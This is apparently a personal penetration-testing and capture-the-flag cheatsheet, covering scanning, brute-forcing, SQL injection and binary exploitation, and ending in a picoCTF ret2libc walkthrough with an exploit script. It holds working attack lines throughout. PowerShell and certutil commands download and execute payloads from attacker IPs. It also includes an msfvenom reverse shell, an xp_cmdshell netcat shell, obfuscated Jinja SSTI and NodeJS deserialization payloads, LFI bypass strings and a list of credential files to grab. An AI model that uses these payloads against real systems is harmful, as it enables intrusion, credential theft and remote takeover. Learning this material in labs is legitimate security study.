# Cheatsheet

Use these notes in case of looking back on syntaxes or best way to run a tool or exploitation methods.
> In no paticular order

## Check Active Machines:
arp -a
arp-scan -l

## Check Open Ports:
ss -tulpn
netstat -ano

## DockerFile:
docker build - < Dockerfile

## C2:
PoshC2: `cd /opt/poshc2; posh-project -n "NEW PROJECT NAME"; posh-config; posh-server `
MythicC2: `cd /opt/mythic-c2; docker-compose up` OR `sudo ./merlin-cli start`
SilverC2: `silver`

## Hidden Windows Folders/Files:
gci -Hidden

## Nmap:
nmap "IP"
nmap -p- "IP"
nmap -A -T4 -p "ports" -oN initial_scan "IP" -vvv
sudo nmap -p- -sV -sC -sS -A -v --min-rate 1000 --max-retries 5 -oN fullportscan "IP"
sudo nmap -p- -sV -sC -sS -A -vvvv -oN portscan.nmap "IP" -Pn
nmap -sV -sC -A -vvvv -oN portscan.nmap "IP"
nmap -p- -vvvv 10.129.181.131

## Nessus
sudo service nessusd start
sudo systemctl nessusd.service start

## RustScan (Better):
rustscan -a "IP" -r 1-65530 -u 5000 -- -A -sC

## Nikto:
nikto --host "URL"

## Check for Alive URLs
cat subdomains.txt | httprobe -s -p https:443 | sed 's/https\?:\/\///' | tr -d ':443' *Look for admin/stag/dev. They could be good*

## Send file to Windows (URLCACHE Method)
certutil -urlcache -f http://10.17.4.195/mimikatz-32.exe mimikatz.exe

## Send file to Windows (Powershell Method)
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.14.12.230/CLSID.ps1')"
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.14.12.230/CLSID.ps1')|iex"
powershell -c (New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.14.12.230/CLSID.ps1" -OutFile "CLSID.ps1"

## Medusa (Bruteforce):
medusa -h "IP" -u "username" -P "PASSWORD WORDLIST" -M "MODULE (EG; SMBNT)"

## Hydra (Bruteforce):
hydra -f -l "USERNAME" -P "PASSWORD WORDLIST" "IP" (eg; smb)

## DIRB:
dirb "URL"
dirb "URL" -X "EXTENTIONS"
dirb "URL" "WORDLIST"

## GOBUSTER:
gobuster dir -u "URL" -w "WORDLIST" -x "EXTENTIONS"
gobuster dir -u http://10.10.82.152 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php,html,txt,bak --no-error -o dir.gobuster

## DIRSEARCH:
dirsearch -u "URL" -w "WORDLIST" -e "EXTENTIONS"

## Finding Domain TXT Records
dig axfr @"IP" "DOMAIN"

## MYSQL:
mysql -u "USERNAME" -D "DATABASE NAME" -p
commands = http://g2pc1.bu.edu/~qzpeng/manual/MySQL%20Commands.htm
*Try to look for .mysql_history and see if it has clear text passwords in it*
mysql -h "IP ADDRESS" -u "USERNAME" -D "DATABASE NAME" -p *REMOTE LOGIN*

## SQL on Windows:
mssqlclient.py "USERNAME"@"IP ADDRESS" --windows-auth
sqsh -U "USERNAME" -P "PASSWORD" -H "IP ADDRESS"
> Can try `enable_xp_cmdshell` to see if we can run commands on it
> If works we can get a shell using nc
```
smbserver.py -smb2support shareName $(pwd)
xp_cmdshell \\10.10.15.75\shareName\nc64.exe -e cmd.exe 10.10.15.75 443
```

## SQL from DB file:
sqlite3 "DATABASE FILE" 
Commands:
.help
.tables
select * from "TABLE"

## SQLMAP:
sqlmap -r request.txt -a --batch (request should have parameters like test:test for easy sql)
sqlmap -u 'URL' --forms --dump

## SMB:
msfconsole:- "AUXILIARY/SCANNER/SMB/SMB_VERSION" *Use this to get SMB Version*
smbclinet -L /"IP" *To list the shares*
smbclient //"IP"/"SHARE" *To access the share*
smbclient //"IP"/"SHARE" -U "username" *To provide a username*
nmap --script smb-enum-users "IP" *To get usernames using nmap*

## SMB Server:
smbserver.py -smb2support -user "USERNAME" -password "PASSWORD" shareName $(pwd)
smbserver.py -smb2support shareName $(pwd)

## Zone Transfer:
dig axfr <> <>

## FTP:
Try the command "cd ..." to change directory *Maybe one of the directory is hidden in ...*
Always use the command "ls -lah" to check the files in FTP folder *Maybe one of them is hidden*

## xfreerdp:
xfreerdp /u:"USERNAME" /p:'PASSWORD' /v:"IP ADDRESS" +clipboard /dynamic-resolution

## FTP Server:
sudo python3 -m pyftpdlib 21

## SCP:
scp remote_username@10.10.0.2:/remote/file.txt /local/directory

## WPSCAN:
wpscan --url "URL" -e u,ap,at,dbe --plugins-detection aggressive

## Gobuster:
gobuster dir -u "URL" -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,bak *Directory Bruteforcing*
gobuster dns -d "URL" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt *Subdomain Enumeration*

## LFI Files to Look For:
https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html

> LINUX:
https://github.com/D35m0nd142/LFISuite/blob/master/pathtotest.txt
/etc/issue
/etc/profile
/proc/version
/etc/passwd
/etc/shadow
/root/.bash_history
/var/log/dmessage
/var/mail/root
/root/.ssh/id_rsa
/var/log/apache2/access.log
/proc/self/cmdline
/proc/<NUMBERS FROM 1 - 1000 TO CHECK FOR 1000 PROCESSES>/cmdline
config files
/etc/apache2/sites-available/000-default.conf
/etc/apache2/sites-available/<VHOST NAME>.conf

> WINDOWS:
C:\boot.ini
https://hakluke.medium.com/sensitive-files-to-grab-in-windows-4b8f0a655f40
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt

## Windows Reverse Shell:
1- msfvenom -p windows/meterpreter/reverse_tcp lhost=10.9.252.17 lport=1234 -f exe > shell.exe
2- certutil.exe -urlcache -split -f http://10.9.252.17/shell.exe shell.exe & shell.exe

## LFI FILTER BYPASS:
/?page=php://Filter/convert.base64-encode/resource=config
/index.php?file=../../../../../../../../etc/passwd
/index.php?file=../../../../../../../../etc/passwd%00
/index.php?file=../../../../../../../../etc/passwd/.
/index.php?file=....//....//....//....//....//....//....//....//etc//passwd

## SNMP (Port 161):
snmpwalk -c public -v2c -On <IP>

## Meterpreter
load powershell = Loads Powershell into meterpreter session
powershell_shell = Runs a powershell shell

## Meterpreter Portfwd
```bash
run auroroute -s "IP RANGE/SUBNET"
```
```bash
portfwd add -l <local port on the attacking machine (yours)> -p <victim port we want to access> -r <victim IP address>
```

## NodeJS Deserialization Attack
```
{"email":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ping -c 1 10.14.12.230',function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```

## Finding Possible LFI 
ffuf -c -r -u 'http://10.0.0.12/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 0

## Jinja SSTI Injection
```
{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(360)('id',stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)}}
```
```
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73')['\x70\x6f\x70\x65\x6e']('ls')['read']()}}
```
## SEARCHSPLOIT:
searchsploit "SERVICE"
searchsploit -x "EXPLOIT PATH" *To examine the code of the exploit*
searchsploit -m "EXPLOIT PATH" *Copy the exploit to the working directory*

## Rbash Escape:
python -c 'import os;os.system("/bin/bash")'

## Permissions
find / -type f -perm -u=s 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

## Checking a PID's DLLs in Windows
tasklist /m /fi "pid eq `PID`"

## Git Shit
git log . = Check git logs from a .git/ folder
git show "COMMIT ID" = Check details of a specific commit

## Vim CHeatsheet:
"I" = Insert Mode
"O" = Insert Mode with a New Line
"ESC" = Exit Insert Mode
"x" = Remove the Character the Cursor is On
":" = Type Commands
":wq" = Exit Vim and save
":syntax on" = Set Syntax
":set numbers" = Set Numbers On
"SHIFT+G" = Get to the bottom quickly
"H,J,K,L" = Move Around Using Keyboard
"d+d" = Remove a Full Line

## GCC:
disable all protections = gcc stack-zero.c -o stack-zero -fno-stack-protector -no-pie -Wl,-z,norelro

## GDB PEDA/GEF Cheatsheet:
"checksec" = Check Program Securities
"r" = Run the Program
r "arg" = Run the Program with the Given Argument
"start" = Run the Program and Stop at the Argument Asking Portion
"info functions" = See the Functions of the program
disass "function name" = Disassemble Function
disass (star)"address" = Set Breakpoint at an Adress
i r "register" = Dump value of a register
pattern create "number" = Create a Pattern of number of values
pattern offset "address" = Know what offset of value the address has
break "MAIN" = set breakpoint at main
break (STAR)0x08048414 = set breakpoint at address 0x08048414
"info break" = Know where the Breakpoints are Set
del "number of breakpoint" = Delete a Breakpoint
"delete" OR "d" = delete all breakpoints
(After runnning start) find "/bin/sh" = Find the addres of "/bin/sh"
"p &system" = Find the addres of "system"
"p &exit" = Find the addres of "exit"
x/10x $sp = Look at 10 valuies from stack frame
x/s $rax = examine rax stack values
vmmap = shows all the addresses binary is loading at
aslr on/off = ASLR is by default OFF in GDB so use this to turn it on and then re-run the binary

Incase of 64-Bit binary, the input wont be getting into RIP it will be at RSP. Because the binary wont even try to get to the invalid address (0x41414141). So use the first 4 bytes of the iunput from RSP to check offset

"pattern offset saaa" = Here "saa" is the first 4 from input in RSP

## GDB PWNDBG:
r < <(cyclic 50) = Run the program and give 50 byte input
cyclic -l "EIP" = To check the offset

## PWNTOOLS:
connect to a remote location:
	target = remote("github.com", 9000)
process the binary
	target = process("./challenge")
attach a GDB session
	gdb.attach(target)
attach a GDB session and run a command after
	gdb.attach(target, gdbscript='b (STAR)main')
send variable x to targer
	target.send(x)
send variable x and append a new line at the end
	target.sendline(x)
print a single line
	print target.recvline()
print all text until test
	print target.recvuntil("test")
pack it into endian format
	p32() OR p64()
interact with the program
	target.interactive()

Use the template from cryptocat/github 

## Checking Protections on ELF Binay
checksec "BINARY"
rabin2 -I "BINARY"

## Checking Functions of ELF Binary
rabin2 -i "BINARY"
readelf -s ./"BINARY" | grep "FUNC"
rabin2 -s split | grep "FUNC"
rabin2 -qs split | grep -ve imp -e ' 0 ' *To find Important Functions (May or may not give interesting functions)*

## Checking Useful Strings on ELF Binary
rabin2 -z split

## Metasploit for Exploit Development:
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
/usr/share/metasploit-framework/tools/exploit/pattern_ofrfset.rb

## Ropper
ropper --search "pop rdi"
ropper -- --search "pop rdi" *In pwndbg*

## RopGadget
RopGadget --binary "BINARY" = To get the ROP Gadgets

## Radare2
aaaaaa= analyse eveything
oo+= read + write enable
i= after read write avalibility do this to insert and edit
s main= focus on main function
V= visual mode
p= in visual mode to change visuals
afl= print all functions
pdf= print current focused funtion
pdf @"FUNCTION"= print the function specified

## Strings
strings -e l "FILE" *encoded strings*

## Windows Enumeration:
systeminfo = Enumerate

## Adding this here for future references. This is from heres-a-libc challenge from picoctf.
<!--
system/printf/scanf is going to be the same but the libc addresses change in ASLR
This allows us to calculate all the other addresses if we are able to leak just one

We will use 'puts' to leak the libc. So if we use 'puts' in .plt and then the address of 'scanf' in .got.plt, it wont print the address that we gave. Instead it will give us the actual address of 'scanf'.
Here we will now use ROP to leak the libc.

ROP Gadet = A sequence of instructions that end up in the return instruction

We used ROPGadget to get the ROP Gadgets we can use. Found 131.
We need the correct calling conventions to build up a valid exploit. The calling conventions can be found at https://en.wikipedia.org/wiki/X86_calling_conventions. We need to find 'x86-64' and in 'Linux(GCC)'. Found this:
RDI, RSI, RDX, RCX, R8, R9, [XYZ]MM0–7
We now have to find some value to modify RDI. Ideally we can look for POP RDI to then modify the RDI.
Found this:
0x0000000000400913 : pop rdi ; ret
Now we can put this and the scanf funtion address in the exploit.

We can also search for ROP Gadgets using pwntools if we have ROP defined:
rop = ROP('./vuln')
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

Now it will execute the POP RDI instruction and put scanf address in there. This will hit a RET instruction and then we can add out puts funtion in there. We found the puts instruction in the '.plt' from Ghidra:
puts = 0x0400540
We use plt for this because the program also uses 'puts@plt' to call it.

After the call to puts, if we dont provide anything, the program will crash so we will put the main address also for simplicity

##################################################
        PASTING THE EXPLOIT SCRIPT HERE
##################################################

# Pass in pattern_size, get back EIP/RIP offset
offset = 136
# 122

# Start program
io = start()

# ROP Gadets
# 0x0000000000400913 : pop rdi ; ret
pop_rdi= 0x0400913

# Scanf and Puts funtion to leak the address
scanf_at_got= 0x0601038
puts= 0x0400540

# Build the payload
payload = flat({
    offset: [
    pop_rdi,
    scanf_at_got,
    puts,
    elf.symbols.main
    ]
})

# Send the payload
io.sendlineafter('\n', payload)

# Printing the leak address
io.recvline()
leak= u64(io.recvline().strip().ljust(8,b'\x00'))
log.info(f"{hex(leak)=}")

# Got Shell?
io.interactive()

##################################################
                        EOF
##################################################

This gave us a leak address = 0\x7fn\x8f\x91\x7f. To make to output better we use strip() to get rid of the new line. Then u64() to repack the leaked address. And using ljust() to make the output better for pwntools u64(). u64() uses 8 bytes so we can append it with null bytes for it. And we put hex at the start of leak so we can convert it to hex as well which gives us 0x7fe8a89fbf30. ANd we have pur scanf address.

Now we can calculate the offset between the function we want and the function we leaked which would be the diff bw our leaked address and system address.

We can use base address of libc and then calculate the offset. We can do that with our libc file that we have.

```
readelf -s ./libc.so.6 | grep scanf
```
We have scanf at 0x07b0b0

```
scanf_offset= 0x07b0b0
base_address_of_libc= leak - scanf_offset
```

Using the same way, we can calculate system address. By adding the base address with the system address of out libc file. Or we can do
```
strings -tx libc.so.6 | grep "/bin/sh"
```

```

```
system_offset= 0x04f4e0
system_address= base_address_of_libc + system_offset
```
Now to get /bin/sh. We will be using libc file because it always have a /bin/sh function. We can confirm that if we run strings with grep of /bin/sh. TO actually find it open libc in Ghidra and without analyzing the file search for /bin/sh and get the address. Use 's' to search in memory. Then use strings search and type '/bin/sh' and get the address.

Now put it all together as a second payload that gives you a shell
```
payload = flat({
    offset: [
    pop_rdi,
    bin_sh_address,
    system_address
    ]
})
```
And it gives us nothing. We can now get to debugging. We can use gdb.attach(io) to get a GDB session working but as this template already has a gdb session function we will use that.
Once in GDB set a breakpoint at the return instruction of do_stuff() which is at 0x0400770. And we can see our first ROP chain POP RDI. If we step ahead and get to our POP RDI we can then continue to hit the other breakpoint. Then we can 'si' again and then examine RDI. We get a 'Cannot access memory at ....'. Its typical with ROP chains to have to debug them. We will check if our base address leak is working with the same code to get the libc leak.
```
log.info(f"{hex(base_address_of_libc)=}")
```
We get '0x7f2ad09a6e80'. Which is wrong. The last libc values should be zero because whenever you load a library in memory the last values should be zero. So lets debug it again in GDB and set breakpoint in main.

Keep continuing until you see the scanf leak in your script. Copy the leak address and examine it in GDB using 'x  "ADDRESS"' and see if it gives us scanf. We get <__isoc99_scanf> instead of scanf itself. And if we search for <__isoc99_scanf> in libc we cant find it.

So we will leak another address from .got.plt. Lets use puts. We get the address of puts from the .got.plt first and put it in place of scanf address. Then grep puts address from libc and put it in place of scanf offset.
We get an error again. Lets go setbuf this time.

We get a error again. Lets continue through our GDB sessions and set break at do_stuff() and at return of do_stuff(). Keep continuing. We can then check the leak if it is correct with 'x "LEAKED ADDRESS"' which is right at pointingf to our setbuf. Then we can do 'vmmap' to check for our libc address and the base libc leak if they match. They do. We can do a 'p system - "START ADDRESS OF LIBC"' to see if they give us what is equal to system_offset. Thats good too. Now do a 'ni' and keep going till scanf funtion call. Then a 'ni' again to where it takes our input. Copy the RDI instruction and then use 'telescope "RDI" 64'. Now after our POP RDI, we dont see our /bin/sh which should be after POP RDI.

We will do a search for our /bin/sh. Do the vmmap again to get the start of libc address and the end as well. The end address is not the line end but the end of all of the libc. Use:
```
find "START ADDRESS","END ADDRESS","/bin/sh"
```
And we get a /bin/sh address at 0x7fa78c1780fa. We can then test it with 'x/s "ADDRESS"' and it will give us /bin/sh. Now we can print the subtraction with the 'p "ADDRESS OF /BIN/SH" - "ADDRESS OF LIBC START"' and we get a 1786106 which in hex is 0x01b40fa instead of our 0x02b40fa. We found the error.

We can also search for it using pwntools if we have libc defined:
# Payload
payload = flat({
    offset: [
    pop_rdi,
    next(libc.search(b'/bin/sh\x00')),
    libc.symbols.system
    ]
})

But it still didnt work. This might be an issue with the stack alignment. We can see this that it gives us the xmm0 in the stack if we go through instructions inGDB. This occurs due to the issue of libc versions. The binary is using the system libc instead of the provided libc. For this we can put a ret_inst from ROPGadget just above the system call and fix it. We need the last digit to be zero instead of an 8 before calling system. So we do a ret instruction which edits the RSP instruction.

This fixes it and we now have a SHELL!!! We can do remote and also change to info mode to make it a bit pretty.
Also got the source code from remote so copied it as well.

GOT = Global Offset
PLT = Procedural Linking Table

.got.ptl is the actual one that we always go to look for these addresses in partial RELRO
-->